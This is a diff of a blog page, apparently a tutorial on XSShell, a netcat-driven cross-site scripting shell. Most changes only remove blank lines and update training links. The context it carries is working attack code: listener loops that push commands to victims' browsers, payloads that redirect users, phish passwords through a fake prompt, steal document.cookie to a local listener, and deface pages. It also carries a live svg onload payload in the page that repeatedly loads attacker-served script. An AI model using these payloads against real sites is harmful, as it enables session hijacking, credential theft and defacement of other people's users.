@@ -55,22 +55,18 @@
 <div class="codehilite"><pre><span></span><code>while :; do printf &quot;j$ &quot;; read c; printf &quot;HTTP/1.1 200 OK\n\n$c&quot; | nc -lp 8000 &gt;/dev/null; done
 </code></pre></div>
 
-
 <h4>OS X</h4>
 <div class="codehilite"><pre><span></span><code>while :; do printf &quot;j$ &quot;; read c; printf &quot;HTTP/1.1 200 OK\n\n$c&quot; | nc -l 8000 &gt;/dev/null; done
 </code></pre></div>
 
-
 <h3>Example Payloads</h3>
 <h4>Redirection</h4>
-<div class="codehilite"><pre><span></span><code>window.location = &#39;http://lanmaster53.com/training/&#39;
+<div class="codehilite"><pre><span></span><code>window.location = &#39;https://www.practisec.com/training/&#39;
 </code></pre></div>
-
 
 <h4>Phishing</h4>
 <div class="codehilite"><pre><span></span><code>i=new Image();i.src=&quot;http://127.0.0.1:8888/pw/&quot;+prompt(&quot;Password:&quot;)
 </code></pre></div>
-
 
 <ul>
 <li>Requires a second listener, e.g. <code>python -m "SimpleHTTPServer" 8888</code>.</li>
@@ -79,14 +75,12 @@
 <div class="codehilite"><pre><span></span><code>i=new Image();i.src=&quot;http://127.0.0.1:8888/pw/&quot;+document.cookie
 </code></pre></div>
 
-
 <ul>
 <li>Requires a second listener, e.g. <code>python -m "SimpleHTTPServer" 8888</code>.</li>
 </ul>
 <h4>Defacement</h4>
 <div class="codehilite"><pre><span></span><code>d=document;e=d.createElement(&quot;p&quot;);e.innerHTML=&quot;lanmaster53 wuz here!&quot;;d.body.appendChild(e)
 </code></pre></div>
-
 
 <h3>Credits</h3>
 <p>This is all based on the code shared in the following tweets.</p>
@@ -98,15 +92,13 @@
 <blockquote class="twitter-tweet tw-align-center" data-conversation="none" lang="en"><p lang="en" dir="ltr">XSShell - Attacker<br><br>$ while :; do printf &quot;j$ &quot;; read c; echo <a href="https://twitter.com/search?q=%24c&amp;src=ctag">$c</a> | nc -lp PORT &gt;/dev/null; done</p>&mdash; Brute (@brutelogic) <a href="https://twitter.com/brutelogic/status/639073880922030080">September 2, 2015</a></blockquote>
 </div>
 </div>
-
 <script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
 
 <!-- attack payload -->
-
 <p><svg/onload=setInterval(function(){d=document;try{d.getElementById("x").remove()}catch(e){};z=d.createElement("script");z.id="x";z.src="http://127.0.0.1:8000";d.body.appendChild(z)},3000)></p>
 <p>Check the source code here ^^^ for the active payload.</p>
 </div>
-<p>Like what you see? Join me for live training! See the <a href="/training/">Training</a> page for more information.</p>
+<p>Like what you see? Join me for live training! See the <a href="https://www.practisec.com/training/">Training</a> page for more information.</p>
 <hr>
 <div class="comments">
     <h6>Please share your thoughts, comments, and suggestions via Twitter.</h6>
